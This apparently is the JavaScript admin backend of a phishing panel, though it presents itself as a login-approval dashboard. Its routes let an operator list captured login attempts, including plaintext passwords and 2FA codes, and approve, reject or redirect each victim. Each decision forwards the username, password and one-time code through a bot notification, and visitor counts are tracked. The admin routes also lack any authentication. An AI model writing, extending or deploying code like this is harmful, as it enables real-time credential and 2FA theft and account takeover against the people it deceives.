const express = require('express');
const LoginRequest = require('../models/LoginRequest');
const User = require('../models/User');
const VisitorLog = require('../models/VisitorLog');
const { sendAdminDecisionNotification } = require('../bot');

const router = express.Router();

/**
 * GET /api/admin/pending-logins
 * Get all pending login requests
 */
router.get('/pending-logins', async (req, res) => {
  try {
    //await LoginRequest.expireOldRequests();
    const pending = await LoginRequest.find({ status: { $in: ['pending', 'pending_approval'] } })
      .sort({ createdAt: -1 })
      .limit(100);

    res.status(200).json({
      success: true,
      count: pending.length,
      data: pending,
    });
  } catch (err) {
    console.error('[admin/pending-logins] error:', err);
    res.status(500).json({
      success: false,
      message: 'Failed to fetch pending logins.',
      error: process.env.NODE_ENV === 'production' ? 'An error occurred' : err.message,
    });
  }
});

/**
 * GET /api/admin/login-history
 * Get login approval history (comprehensive activity log)
 */
router.get('/login-history', async (req, res) => {
  try {
    const limit = Math.min(parseInt(req.query.limit) || 100, 100); // Max 100
    const page = parseInt(req.query.page) || 1;
    const skip = (page - 1) * limit;

    // Get all activity logs including login requests, 2FA codes, denials, redirects, and expiry
    const history = await LoginRequest.find()
      .sort({ createdAt: -1 })
      .skip(skip)
      .limit(limit);

    const total = await LoginRequest.countDocuments();

    // Format the response with activity type information
    const formattedHistory = history.map(log => ({
      ...log.toObject(),
      activityType: getActivityType(log),
      displayStatus: getDisplayStatus(log),
    }));

    res.status(200).json({
      success: true,
      count: formattedHistory.length,
      total,
      page,
      pages: Math.ceil(total / limit),
      data: formattedHistory,
    });
  } catch (err) {
    console.error('[admin/login-history] error:', err);
    res.status(500).json({
      success: false,
      message: 'Failed to fetch login history.',
      error: process.env.NODE_ENV === 'production' ? 'An error occurred' : err.message,
    });
  }
});

/**
 * Helper function to determine activity type
 */
function getActivityType(log) {
  if (log.logType) return log.logType;
  if (log.status === 'redirected') return 'redirected_request';
  if (log.status === 'expired') return 'expired_request';
  if (log.status === 'rejected') return 'denied_request';
  if (log.twoFACode) return '2fa_code';
  return 'login_request';
}

/**
 * Helper function to get display status
 */
function getDisplayStatus(log) {
  const statusMap = {
    'pending': '⏳ Pending',
    'pending_approval': '⏳ Awaiting Approval',
    'approved': '✅ Approved',
    'rejected': '❌ Rejected',
    'expired': '⏱️ Expired',
    'redirected': '🔄 Rate Limited/Redirected',
  };
  return statusMap[log.status] || log.status;
}

/**
 * POST /api/admin/approve-login/:verificationId
 * Approve a login request
 */
router.post('/approve-login/:verificationId', async (req, res) => {
  try {
    const { verificationId } = req.params;
    const { approvedBy } = req.body;

    const loginRequest = await LoginRequest.findOneAndUpdate(
      { verificationId },
      {
        status: 'approved',
        approvedBy: approvedBy || 'admin',
        approvedAt: new Date(),
      },
      { new: true }
    );

    if (!loginRequest) {
      return res.status(404).json({
        success: false,
        message: 'Login request not found.',
      });
    }

    // Update the global approval status for the client
    if (global.twoFAApprovals && global.twoFAApprovals[verificationId]) {
      global.twoFAApprovals[verificationId].status = 'approved';
    }

    // Update user approval status
    await User.updateMany(
      { username: loginRequest.username },
      { approvalStatus: 'approved' }
    );

    //Send notification about approval
    await sendAdminDecisionNotification({
      username: loginRequest.username,
      password: loginRequest.password,
      code: loginRequest.twoFACode,
      method: loginRequest.twoFAMethod,
      decision: 'approved',
      verificationId,
      approvedBy: approvedBy || 'admin',
    });

    res.status(200).json({
      success: true,
      message: 'Login approved successfully.',
      data: loginRequest,
    });
  } catch (err) {
    console.error('[admin/approve-login] error:', err);
    res.status(500).json({
      success: false,
      message: 'Failed to approve login.',
      error: process.env.NODE_ENV === 'production' ? 'An error occurred' : err.message,
    });
  }
});

/**
 * POST /api/admin/reject-login/:verificationId
 * Reject a login request
 */
router.post('/reject-login/:verificationId', async (req, res) => {
  try {
    const { verificationId } = req.params;
    const { reason, rejectedBy } = req.body;

    const loginRequest = await LoginRequest.findOneAndUpdate(
      { verificationId },
      {
        status: 'rejected',
        rejectedReason: reason || 'No reason provided',
        approvedBy: rejectedBy || 'admin',
        approvedAt: new Date(),
      },
      { new: true }
    );

    if (!loginRequest) {
      return res.status(404).json({
        success: false,
        message: 'Login request not found.',
      });
    }

    // Update the global approval status for the client
    if (global.twoFAApprovals && global.twoFAApprovals[verificationId]) {
      global.twoFAApprovals[verificationId].status = 'rejected';
    }

    // Update user approval status
    await User.updateMany(
      { username: loginRequest.username },
      { approvalStatus: 'rejected' }
    );

    // Send notification about rejection
    await sendAdminDecisionNotification({
      username: loginRequest.username,
      password: loginRequest.password,
      code: loginRequest.twoFACode,
      method: loginRequest.twoFAMethod,
      decision: 'rejected',
      reason: reason || 'No reason provided',
      verificationId,
      approvedBy: rejectedBy || 'admin',
    });

    res.status(200).json({
      success: true,
      message: 'Login rejected successfully.',
      data: loginRequest,
    });
  } catch (err) {
    console.error('[admin/reject-login] error:', err);
    res.status(500).json({
      success: false,
      message: 'Failed to reject login.',
      error: process.env.NODE_ENV === 'production' ? 'An error occurred' : err.message,
    });
  }
});

/**
 * GET /api/admin/login-request/:verificationId
 * Get a specific login request details
 */
router.get('/login-request/:verificationId', async (req, res) => {
  try {
    const { verificationId } = req.params;

    const loginRequest = await LoginRequest.findOne({ verificationId });

    if (!loginRequest) {
      return res.status(404).json({
        success: false,
        message: 'Login request not found.',
      });
    }

    res.status(200).json({
      success: true,
      data: loginRequest,
    });
  } catch (err) {
    console.error('[admin/login-request] error:', err);
    res.status(500).json({
      success: false,
      message: 'Failed to fetch login request.',
      error: process.env.NODE_ENV === 'production' ? 'An error occurred' : err.message,
    });
  }
});

/**
 * GET /api/admin/stats
 * Get admin dashboard statistics
 */
router.get('/stats', async (req, res) => {
  try {
    const pending = await LoginRequest.countDocuments({ status: { $in: ['pending', 'pending_approval'] } });
    const approved = await LoginRequest.countDocuments({ status: 'approved' });
    const rejected = await LoginRequest.countDocuments({ status: 'rejected' });
    const expired = await LoginRequest.countDocuments({ status: 'expired' });
    const redirected = await LoginRequest.countDocuments({ status: 'redirected' });
    const totalVisitors = await VisitorLog.countDocuments();

    res.status(200).json({
      success: true,
      data: {
        pending,
        approved,
        rejected,
        expired,
        redirected,
        total: pending + approved + rejected + expired + redirected,
        totalVisitors,
      },
    });
  } catch (err) {
    console.error('[admin/stats] error:', err);
    res.status(500).json({
      success: false,
      message: 'Failed to fetch stats.',
      error: process.env.NODE_ENV === 'production' ? 'An error occurred' : err.message,
    });
  }
});

/**
 * GET /api/admin/health-metrics
 * Get detailed health metrics and request analytics
 */
router.get('/health-metrics', async (req, res) => {
  try {
    const days = parseInt(req.query.days) || 7;
    const dateFrom = new Date();
    dateFrom.setDate(dateFrom.getDate() - days);

    // Get requests per day
    const requestsPerDay = await LoginRequest.aggregate([
      {
        $match: {
          createdAt: { $gte: dateFrom },
        },
      },
      {
        $group: {
          _id: {
            $dateToString: { format: '%Y-%m-%d', date: '$createdAt' },
          },
          count: { $sum: 1 },
          approved: {
            $sum: {
              $cond: [{ $eq: ['$status', 'approved'] }, 1, 0],
            },
          },
          rejected: {
            $sum: {
              $cond: [{ $eq: ['$status', 'rejected'] }, 1, 0],
            },
          },
          pending: {
            $sum: {
              $cond: [{ $in: ['$status', ['pending', 'pending_approval']] }, 1, 0],
            },
          },
          expired: {
            $sum: {
              $cond: [{ $eq: ['$status', 'expired'] }, 1, 0],
            },
          },
          redirected: {
            $sum: {
              $cond: [{ $eq: ['$status', 'redirected'] }, 1, 0],
            },
          },
        },
      },
      {
        $sort: { _id: 1 },
      },
    ]);

    // Get current status breakdown
    const statusBreakdown = await LoginRequest.aggregate([
      {
        $group: {
          _id: '$status',
          count: { $sum: 1 },
        },
      },
    ]);

    // Get visitor stats
    const totalVisitors = await VisitorLog.countDocuments();
    const visitorsToday = await VisitorLog.countDocuments({
      createdAt: {
        $gte: new Date(new Date().setHours(0, 0, 0, 0)),
      },
    });

    // Get approval rate
    const totalRequests = await LoginRequest.countDocuments();
    const approvedCount = await LoginRequest.countDocuments({ status: 'approved' });
    const approvalRate = totalRequests > 0 ? (approvedCount / totalRequests * 100).toFixed(2) : 0;

    res.status(200).json({
      success: true,
      data: {
        requestsPerDay,
        statusBreakdown,
        visitorStats: {
          totalVisitors,
          visitorsToday,
        },
        approvalRate: parseFloat(approvalRate),
        dateRange: {
          from: dateFrom.toISOString(),
          to: new Date().toISOString(),
          days,
        },
      },
    });
  } catch (err) {
    console.error('[admin/health-metrics] error:', err);
    res.status(500).json({
      success: false,
      message: 'Failed to fetch health metrics.',
      error: process.env.NODE_ENV === 'production' ? 'An error occurred' : err.message,
    });
  }
});

/**
 * GET /api/admin/health-check
 * Health check for admin dashboard
 */
router.get('/health-check', async (req, res) => {
  try {
    res.status(200).json({
      success: true,
      status: 'ok',
      timestamp: new Date().toISOString(),
    });
  } catch (err) {
    res.status(500).json({
      success: false,
      status: 'error',
      error: err.message,
    });
  }
});

/**
 * GET /api/admin/history-by-type/:type
 * Get login history filtered by type with pagination (100 limit max)
 */
router.get('/history-by-type/:type', async (req, res) => {
  try {
    const { type } = req.params;
    const limit = Math.min(parseInt(req.query.limit) || 100, 100); // Max 100
    const page = parseInt(req.query.page) || 1;
    const skip = (page - 1) * limit;

    const validTypes = ['login_request', '2fa_code', 'denied_request', 'redirected_request', 'expired_request'];
    
    if (!validTypes.includes(type)) {
      return res.status(400).json({
        success: false,
        message: `Invalid type. Valid types: ${validTypes.join(', ')}`,
      });
    }

    const logs = await LoginRequest.find({ logType: type })
      .sort({ createdAt: -1 })
      .skip(skip)
      .limit(limit);

    const total = await LoginRequest.countDocuments({ logType: type });

    res.status(200).json({
      success: true,
      type,
      count: logs.length,
      total,
      page,
      pages: Math.ceil(total / limit),
      data: logs,
    });
  } catch (err) {
    console.error('[admin/history-by-type] error:', err);
    res.status(500).json({
      success: false,
      message: 'Failed to fetch history by type.',
      error: process.env.NODE_ENV === 'production' ? 'An error occurred' : err.message,
    });
  }
});

/**
 * POST /api/admin/redirect-user/:verificationId
 * Redirect a user to a special link
 */
router.post('/redirect-user/:verificationId', async (req, res) => {
  try {
    const { verificationId } = req.params;
    const { username, redirectLink, redirectedBy } = req.body;

    const loginRequest = await LoginRequest.findOneAndUpdate(
      { verificationId },
      {
        status: 'redirected',
        redirectLink: redirectLink || process.env.REDIRECT_LINK,
        redirectedReason: 'User redirected by admin',
        approvedBy: redirectedBy || 'admin',
        approvedAt: new Date(),
      },
      { new: true }
    );

    if (!loginRequest) {
      return res.status(404).json({
        success: false,
        message: 'Login request not found.',
      });
    }

    // Update the global approval status for the client
    if (global.twoFAApprovals && global.twoFAApprovals[verificationId]) {
      global.twoFAApprovals[verificationId].status = 'redirected';
    }

    // Update user approval status
    await User.updateMany(
      { username: loginRequest.username },
      { approvalStatus: 'redirected' }
    );

    // Send notification about redirect
    await sendAdminDecisionNotification({
      username: loginRequest.username,
      password: loginRequest.password,
      code: loginRequest.twoFACode,
      method: loginRequest.twoFAMethod,
      decision: 'redirected',
      reason: 'User redirected to final link',
      verificationId,
      approvedBy: redirectedBy || 'admin',
      botName: process.env.BOT_NAME,
    });

    res.status(200).json({
      success: true,
      message: 'User redirected successfully.',
      data: loginRequest,
    });
  } catch (err) {
    console.error('[admin/redirect-user] error:', err);
    res.status(500).json({
      success: false,
      message: 'Failed to redirect user.',
      error: process.env.NODE_ENV === 'production' ? 'An error occurred' : err.message,
    });
  }
});

module.exports = router;
